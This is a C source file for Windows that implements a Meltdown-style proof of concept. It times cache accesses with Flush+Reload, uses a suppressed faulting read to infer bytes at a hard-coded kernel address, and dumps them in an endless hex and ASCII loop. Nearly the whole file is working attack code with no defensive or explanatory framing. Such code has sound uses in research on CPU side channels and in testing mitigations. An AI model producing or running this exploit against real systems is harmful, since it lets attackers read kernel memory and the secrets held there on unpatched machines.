#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <setjmp.h>
#include <signal.h>
#include <windows.h>
#include <stdint.h>

const char strings[] = {"Michal bialek konczyl nocna zmiane w serwerowni wykopu..."};
char disp[] = "................";
jmp_buf array_access_exception;
jmp_buf buf;
static char* _mem = NULL, * mem = NULL;

static size_t phys = 0;
size_t cache_miss_threshold;
static inline void flush(void* p) {
	_mm_clflush(p);
}
static inline void maccess(void* p) {
	*(volatile size_t*)p;
}
//static uint64_t rdtsc() {
//	uint64_t volatile a = 0, d = 0;
//	__asm {
//
//		RDTSCP
//		MOV DWORD PTR[d], EDX
//		MOV DWORD PTR[a], EAX
//
//	}
//	a = (d << 32) | a;
//	return a;
//}
static inline uint64_t rdtsc() {
	uint64_t a;

	_mm_mfence();
	a = __rdtsc();
	_mm_mfence();

	return a;
}
//int add(int a, int b)
//{
//	__asm {
//		mov eax, DWORD PTR[a]
//		add eax, dword ptr b
//	}
//}
static int flush_reload(void* ptr) {
	uint64_t volatile start = 0, end = 0;

	start = rdtsc();
	maccess(ptr);
	end = rdtsc();

	flush(ptr);

	if (end - start < cache_miss_threshold) {
		return 1;
	}
	return 0;
}
int packed_read(size_t addr) {
	phys = addr;

	char res_stat[256];
	int i, j, r;
	for (i = 0; i < 256; i++)
		res_stat[i] = 0;


	for (i = 0; i < 3; i++) {
		r = read_buf();
		res_stat[r]++;
	}
	int max_v = 0, max_i = 0;

	for (i = 1; i < 256; i++) {
		if (res_stat[i] > max_v && res_stat[i] >= 1) {
			max_v = res_stat[i];
			max_i = i;
		}
	}
	return max_i;
}
int read_buf() {
	//phys = addr;

	size_t retries = 100 + 1;
	uint64_t start = 0, end = 0;



	while (retries--) {

	
		__try {
			//MELTDOWN
			uint64_t volatile  byte;
		retry:
			byte = *(volatile uint8_t*)phys;
			byte <<= 12;
			//if (byte == 0) goto retry;

			*(volatile uint64_t*)(mem + byte);
			//END MELTDOWN;
		}
		__except (1) {
	
		}
		int volatile i;
		for (i = 0; i < 256; i++) {
			if (flush_reload(mem + i * 4096)) {
				if (i >= 1) {
					return i;
				}
			}
		}

	}
	return 0;

}


static void detect_flush_reload_threshold() {
	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
	char dummy[4];
	size_t* ptr=dummy;
	uint64_t start = 0, end = 0;

	maccess(ptr);
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		reload_time += (end - start);
	}
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		flush(ptr);
		flush_reload_time += (end - start);
	}
	reload_time /= count;
	flush_reload_time /= count;

	printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
		flush_reload_time, reload_time);
	cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
	printf("Flush+Reload threshold: %zd cycles\n",
		cache_miss_threshold);
}

void addchar(char a,int id) {
	if (a >= 33 && a <=126 ){
		disp[id] = a;
	}
	else {
		disp[id] = '.';
	}

}

int main() {

	int aX = 2;

	_mem = malloc(4096 * 256);

	mem = (char*)(((size_t)_mem  ) );
	memset(mem, 0xFF, 4096 * 256);


	for (int j = 0; j < 256; j++) {
		flush(mem + j * 4096);
	}

	
	detect_flush_reload_threshold();
	int a = 5;
	int b = 4;

	int result = 2;
	int index=0;
	printf("Test number is: %i \n", result);

	int xretval;
	if ((xretval = setjmp(array_access_exception)) != 0)
	{
		fprintf(stderr, "ERROR");
		return -1;
	}

	
	printf("Value is: \n%s \n",strings);
	printf("Result is: \n");
	unsigned char value='X';
	
	int indexer = 0;
	while (1) {

		value = packed_read((0xFFFFF80000b95000 + index));
		printf("%.2X ", value);
		fflush(stdout);
		addchar(value, indexer);
		index++;
		indexer++;

		if (indexer == 16) {
			printf(" | %s \n [%d]", disp, (0xFFFFF80000b95000 + index));
			indexer = 0;
			//__debugbreak();
		}
	}
	system("pause");
	return 0;
}